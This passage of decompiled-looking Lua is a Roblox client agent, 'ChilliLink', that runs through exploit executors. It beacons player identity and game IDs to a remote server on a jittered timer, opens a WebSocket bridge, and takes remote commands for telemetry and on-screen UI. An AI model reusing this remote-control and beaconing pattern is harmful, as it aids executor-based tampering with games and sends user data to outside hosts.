		["telemetry.snapshot"] = function()
			local result = RunService2.RenderStepped:Wait()
			local totalMemoryUsageMb = nil

			pcall(function()
				totalMemoryUsageMb = game:GetService("Stats"):GetTotalMemoryUsageMb()
			end)

			return {
				fpsEstimate = result > 0 and math.floor(1 / result + 0.5) or nil,
				frameDeltaMs = result * 1000,
				memoryMb = totalMemoryUsageMb,
				playerCount = #Players2:GetPlayers(),
				placeId = game.PlaceId,
				jobId = game.JobId,
				distributedGameTime = Workspace.DistributedGameTime,
				timestamp = DateTime.now().UnixTimestampMillis,
			}
		end,
		["ui.create"] = function(arg)
			local v16, v17 = fn42(true)

			if not v16 then
				error(v17)
			end

			if arg.replace ~= false then
				fn23(tbl24)

				for _, child in ipairs(v16:GetChildren()) do
					child:Destroy()
				end
			end

			local tbl36 = { count = 0 }
			local v18, v19 = fn45(arg.tree, v16, 1, tbl36)
			return { created = fn33(v18), objectCount = tbl36.count, propertyResult = v19 }
		end,
		["ui.update"] = function(arg)
			local v16, v17 = fn43(arg.path)

			if not v16 then
				error(v17)
			end

			return { instance = fn33(v16), result = fn40(v16, arg.props) }
		end,
		["ui.delete"] = function(arg)
			local v16 = fn21(arg.path)
			local v17, v18 = fn43(v16)

			if not v17 then
				if v16 == "" then
					return { deleted = false, reason = "managed UI does not exist" }
				end
				error(v18)
			end

			fn23(tbl24)
			local v19 = fn27(v17)
			v17:Destroy()
			return { deleted = true, path = v19 }
		end,
		["ui.list"] = function(arg)
			local v16, v17 = fn42(false)
			if not v16 then
				return { exists = false, reason = v17 or "managed UI does not exist" }
			end
			local n18 = math.floor(fn22(arg.maxDepth, 1, 10, 6))
			return { exists = true, tree = fn46(v16, 0, n18) }
		end,
		["ui.notify"] = function(arg)
			local v16, v17 = fn42(true)

			if not v16 then
				error(v17)
			end

			local notifications = v16:FindFirstChild("Notifications")

			if not notifications then
				notifications = Instance.new("Frame")
				notifications.Name = "Notifications"
				notifications.AnchorPoint = Vector2.new(1, 0)
				notifications.Position = UDim2.new(1, -16, 0, 16)
				notifications.Size = UDim2.fromOffset(360, 500)
				notifications.BackgroundTransparency = 1
				notifications.Parent = v16
				local uiListLayout = Instance.new("UIListLayout")
				uiListLayout.Padding = UDim.new(0, 8)
				uiListLayout.HorizontalAlignment = Enum.HorizontalAlignment.Right
				uiListLayout.SortOrder = Enum.SortOrder.LayoutOrder
				uiListLayout.Parent = notifications
			end

			local textLabel = Instance.new("TextLabel")
			textLabel.Name = "Notification_" .. HttpService2:GenerateGUID(false)
			textLabel.Size = UDim2.fromOffset(340, 64)
			textLabel.BackgroundColor3 = fn35(arg.color) or Color3.fromRGB(25, 35, 52)
			textLabel.BackgroundTransparency = 0.08
			textLabel.Text = tostring(arg.text):sub(1, 500)
			textLabel.TextColor3 = Color3.fromRGB(240, 247, 255)
			textLabel.TextSize = 16
			textLabel.Font = Enum.Font.GothamSemibold
			textLabel.TextWrapped = true
			textLabel.Parent = notifications
			local uiCorner = Instance.new("UICorner")
			uiCorner.CornerRadius = UDim.new(0, 10)
			uiCorner.Parent = textLabel
			local v18 = fn22(arg.duration, 0.5, 30, 4)

			task.delay(v18, function()
				if textLabel.Parent then
					textLabel:Destroy()
				end
			end)

			return { shown = true, name = textLabel.Name, duration = v18 }
		end,
	}

	local function fn55(arg)
		local str5 = tostring(arg.requestId or "")
		local unknownOrDisallowedMethod = tostring(arg.method or "")
		local v16 = tbl36[unknownOrDisallowedMethod]
		if str5 == "" then
			return
		end

		if not v16 then
			fn29({
				type = "rpc_result",
				requestId = str5,
				success = false,
				error = "Unknown or disallowed method: " .. unknownOrDisallowedMethod,
			})

			return
		end

		task.spawn(function()
			local ok, result = xpcall(function()
				return v16(type(arg.params) == "table" and arg.params or {})
			end, function(arg2)
				return debug.traceback(tostring(arg2), 2)
			end)

			if ok then
				fn29({ type = "rpc_result", requestId = str5, success = true, data = fn28(result) })
			else
				fn29({ type = "rpc_result", requestId = str5, success = false, error = tostring(result):sub(1, 2000) })
			end
		end)
	end

	local function fn56(arg)
		local ok, result = pcall(function()
			return HttpService2:JSONDecode(tostring(arg))
		end)

		if not ok or type(result) ~= "table" then
			fn20("Invalid JSON message")
			return
		end

		if result.type == "identify_ok" then
			fn19("Connected to bridge. Client ID:", tostring(result.clientId))
			local tbl37 = {}

			for k in pairs(tbl36) do
				table.insert(tbl37, k)
			end

			table.sort(tbl37)
			fn30("agent.ready", { clientId = result.clientId, methods = tbl37, playerCount = #Players2:GetPlayers() })
			return
		end

		if result.type == "pong" then
			fn19("PONG", tostring(result.seq or ""))
			return
		end

		if result.type == "rpc_request" then
			fn55(result)
			return
		end

		if result.type == "identify_error" then
			fn20("Bridge rejected identity:", tostring(result.error))
		end
	end

	local function fn57()
		flag7 = false
		fn23(tbl23)
		if not v15 then
			return
		end

		pcall(function()
			if type(v15.Close) == "function" then
				v15:Close()
			elseif type(v15.close) == "function" then
				v15:close()
			end
		end)

		v15 = nil
	end

	local function fn58()
		local v16, v17 = fn24()
		if not v16 then
			fn20("No supported WebSocket API found")
			return false
		end
		n14 += 1
		local v18 = n14
		fn19("Connecting to", str2, "using", v17)

		local ok, result = pcall(function()
			return v16(str2)
		end)

		if not ok or not result then
			fn20("Connection failed:", tostring(result))
			return false
		end
		v15 = result
		flag7 = true
		local onMessage = fn25(v15, "OnMessage", "MessageReceived")
		local onClose = fn25(v15, "OnClose", "Closed", "OnDisconnect")
		local onError = fn25(v15, "OnError", "Error")

		local v19 = fn26(onMessage, function(arg)
			if v18 == n14 then
				fn56(arg)
			end
		end)

		if v19 then
			table.insert(tbl23, v19)

			local v20 = fn26(onClose, function(...)
				if v18 == n14 then
					flag7 = false
					fn20("Socket closed", ...)
					return
				end
			end)

			if v20 then
				table.insert(tbl23, v20)
			end

			local v21 = fn26(onError, function(...)
				if v18 == n14 then
					local v21 = fn20
					local v22 = table.pack(...)
					v21("Socket error", table.unpack(v22, 1, v22.n))
					flag7 = false
					return
				end
			end)

			if v21 then
				table.insert(tbl23, v21)
			end

			local v22, v23 = fn29({
				type = "identify",
				clientType = "roblox",
				token = str,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				userId = localPlayer2.UserId,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str4,
			})

			if not v22 then
				fn20(v23)
				flag7 = false
			end

			task.spawn(function()
				while flag6 and flag7 and v18 == n14 do
					task.wait(20)

					if flag6 and flag7 and v18 == n14 then
						n15 += 1
						local v24, v25 = fn29({ type = "ping", seq = n15 })

						if not v24 then
							fn20("Heartbeat failed:", tostring(v25))
							flag7 = false
						end
					end
				end
			end)

			while flag6 and flag7 and v18 == n14 do
				task.wait(0.5)
			end

			if v18 == n14 then
				fn57()
			end

			return true
		end

		fn20("Socket has no supported message event")
		fn57()
		return false
	end

	table.insert(tbl22, Players2.PlayerAdded:Connect(function(player)
		if flag5 then
			fn30("player.added", fn54(player, true))
		end
	end))

	table.insert(tbl22, Players2.PlayerRemoving:Connect(function(player)
		if flag5 then
			fn30("player.removing", fn54(player, true))
		end
	end))

	genv.StopChilliLink = function()
		if not flag6 then
			return
		end
		fn19("Stopping agent")
		flag6 = false
		n14 += 1
		fn23(tbl22)
		fn23(tbl24)
		fn57()
	end

	local request_2 = syn and syn.request or http_request or request or request_ and request_.request or fluxus and fluxus.request

	local function fn59()
		if type(request_2) ~= "function" then
			return nil
		end

		local ok, result = pcall(function()
			return HttpService2:JSONEncode({
				token = str,
				userId = localPlayer2.UserId,
				name = localPlayer2.Name,
				displayName = localPlayer2.DisplayName,
				placeId = game.PlaceId,
				jobId = game.JobId,
				version = str4,
			})
		end)

		if not ok then
			return nil
		end
		local ok2, result2 = pcall(request_2, { Url = str3, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = result })
		if not ok2 or type(result2) ~= "table" or tonumber(result2.StatusCode) ~= 200 then
			return nil
		end

		local ok3, result3 = pcall(function()
			return HttpService2:JSONDecode(tostring(result2.Body))
		end)

		if ok3 and type(result3) == "table" then
			return result3
		end
		return nil
	end

	task.spawn(function()
		while flag6 do
			local v16 = fn59()
			local n18 = 60

			if v16 then
				n18 = fn22(v16.interval, 5, 600, 60)

				if v16.connect == true and not flag8 and not flag7 then
					flag8 = true

					task.spawn(function()
						pcall(fn58)
						flag8 = false
					end)
				end
			end

			task.wait(n18 * (0.85 + math.random() * 0.3))
		end

		fn19("Agent stopped")
	end)
end
